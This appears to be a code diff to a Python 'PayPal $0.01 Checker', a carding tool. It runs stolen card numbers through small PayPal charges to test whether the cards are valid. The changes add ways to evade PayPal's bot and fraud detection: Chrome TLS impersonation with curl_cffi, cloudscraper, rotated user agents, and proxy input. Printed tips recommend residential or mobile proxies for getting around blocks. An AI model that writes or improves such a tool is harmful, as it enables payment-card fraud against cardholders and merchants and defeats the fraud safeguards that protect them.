@@ -1,14 +1,31 @@
 """
 PayPal $0.01 Checker - Standalone Version for Pydroid
 Fixed CSRF Error with improved token extraction and retry logic
+Added proxy support and anti-detection
 """
 
 import re
 import json
-import requests
 import random
 import uuid
 import time
+
+# Try to import curl_cffi first (best for anti-detection)
+try:
+    from curl_cffi import requests as curl_requests
+    HAS_CURL_CFFI = True
+except ImportError:
+    HAS_CURL_CFFI = False
+
+# Fallback to cloudscraper
+try:
+    import cloudscraper
+    HAS_CLOUDSCRAPER = True
+except ImportError:
+    HAS_CLOUDSCRAPER = False
+
+# Final fallback to regular requests
+import requests
 
 # Try to import optional dependencies
 try:
@@ -16,28 +33,31 @@ try:
     HAS_FAKER = True
 except ImportError:
     HAS_FAKER = False
-    print("[!] Faker not installed. Run: pip install faker")
 
 try:
     from fake_useragent import UserAgent
     HAS_UA = True
 except ImportError:
     HAS_UA = False
-    print("[!] fake_useragent not installed. Run: pip install fake-useragent")
+
+# Print available modules
+print("[*] Anti-detection modules:")
+print(f"    - curl_cffi: {'✓' if HAS_CURL_CFFI else '✗ (pip install curl_cffi)'}")
+print(f"    - cloudscraper: {'✓' if HAS_CLOUDSCRAPER else '✗ (pip install cloudscraper)'}")
+print(f"    - faker: {'✓' if HAS_FAKER else '✗ (optional)'}")
+print()
 
 
 class PaypalGate:
-    """Paypal $0.01 Charge Gate - Fixed CSRF Version"""
+    """Paypal $0.01 Charge Gate - Fixed CSRF Version with Anti-Detection"""
     
     def __init__(self, proxy=None):
-        self.s = requests.Session()
         self.proxy = proxy
+        self.use_curl_cffi = False
+        self.use_cloudscraper = False
         
-        # Initialize Faker
-        if HAS_FAKER:
-            self.fake = Faker('en_US')
-        else:
-            self.fake = None
+        # Chrome versions for realistic user agents
+        chrome_versions = ['120.0.0.0', '121.0.0.0', '122.0.0.0', '123.0.0.0', '124.0.0.0', '125.0.0.0', '126.0.0.0', '127.0.0.0', '128.0.0.0', '129.0.0.0', '130.0.0.0', '131.0.0.0']
         
         # Random user agent
         if HAS_UA:
@@ -45,13 +65,42 @@ class PaypalGate:
                 ua = UserAgent()
                 self.user_agent = ua.random
             except:
-                self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
+                cv = random.choice(chrome_versions)
+                self.user_agent = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv} Safari/537.36'
         else:
-            self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
+            cv = random.choice(chrome_versions)
+            self.user_agent = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv} Safari/537.36'
         
-        # Apply proxy if provided
-        if proxy:
-            self.s.proxies = {'http': proxy, 'https': proxy}
+        # Initialize session with best available method
+        if HAS_CURL_CFFI:
+            # Best option - mimics Chrome TLS fingerprint
+            self.s = curl_requests.Session(impersonate="chrome120")
+            self.use_curl_cffi = True
+            if proxy:
+                self.s.proxies = {'http': proxy, 'https': proxy}
+        elif HAS_CLOUDSCRAPER:
+            # Good option - bypasses basic bot detection
+            self.s = cloudscraper.create_scraper(
+                browser={
+                    'browser': 'chrome',
+                    'platform': 'windows',
+                    'mobile': False
+                }
+            )
+            self.use_cloudscraper = True
+            if proxy:
+                self.s.proxies = {'http': proxy, 'https': proxy}
+        else:
+            # Fallback - regular requests
+            self.s = requests.Session()
+            if proxy:
+                self.s.proxies = {'http': proxy, 'https': proxy}
+        
+        # Initialize Faker
+        if HAS_FAKER:
+            self.fake = Faker('en_US')
+        else:
+            self.fake = None
     
     def generate_fake_data(self):
         """Generate fake user data"""
@@ -160,9 +209,21 @@ class PaypalGate:
                 response = self.s.get('https://www.paypal.com/ncp/payment/BKVC4EKUZY9K2', headers=headers, timeout=30)
                 
                 # Check if blocked or captcha page
-                if 'captcha' in response.text.lower() or 'blocked' in response.text.lower():
+                resp_lower = response.text.lower()
+                is_blocked = (
+                    'captcha' in resp_lower or 
+                    'blocked' in resp_lower or
+                    'security challenge' in resp_lower or
+                    'unusual activity' in resp_lower or
+                    'verify you' in resp_lower or
+                    'robot' in resp_lower or
+                    'automated' in resp_lower or
+                    len(response.text) < 1000  # Too short = likely blocked
+                )
+                
+                if is_blocked and 'csrfToken' not in response.text:
                     if attempt < max_retries - 1:
-                        time.sleep(1)
+                        time.sleep(2)  # Wait longer
                         continue
                     return "Declined ❌", "Blocked by PayPal"
                 
@@ -415,7 +476,20 @@ def extract_card(text):
 def main():
     print("=" * 50)
     print("  PayPal $0.01 Checker - CSRF Fixed Version")
+    print("         + Anti-Detection + Proxy Support")
     print("=" * 50)
+    print()
+    
+    # Get proxy input (optional)
+    print("[?] Proxy helps avoid PayPal blocks")
+    print("    Format: http://user:pass@ip:port or http://ip:port")
+    proxy_input = input("Enter Proxy (or press Enter to skip): ").strip()
+    proxy = proxy_input if proxy_input else None
+    
+    if proxy:
+        print(f"[*] Using proxy: {proxy[:30]}...")
+    else:
+        print("[!] No proxy - may get blocked by PayPal")
     print()
     
     # Get card input
@@ -432,12 +506,18 @@ def main():
     
     print(f"\n[*] Card: {fullcc}")
     print("[*] Gateway: PayPal $0.01")
+    if HAS_CURL_CFFI:
+        print("[*] Mode: curl_cffi (Chrome TLS)")
+    elif HAS_CLOUDSCRAPER:
+        print("[*] Mode: cloudscraper")
+    else:
+        print("[*] Mode: requests (basic)")
     print("[*] Processing...\n")
     
     start_time = time.time()
     
     # Check the card
-    status, response = check_paypal(cc, mm, yy, cvv)
+    status, response = check_paypal(cc, mm, yy, cvv, proxy)
     
     end_time = time.time()
     timetaken = round(end_time - start_time, 2)
@@ -452,6 +532,15 @@ def main():
     print(f"[•] Response: {response}")
     print(f"[•] Time: {timetaken}s")
     print("=" * 50)
+    
+    # Tips if blocked
+    if "Blocked" in response or "CSRF" in response:
+        print()
+        print("[!] TIPS to fix blocks:")
+        print("    1. Use a proxy (residential/mobile best)")
+        print("    2. Install: pip install curl_cffi")
+        print("    3. Install: pip install cloudscraper")
+        print("    4. Wait a few minutes and try again")
 
 
 if __name__ == "__main__":
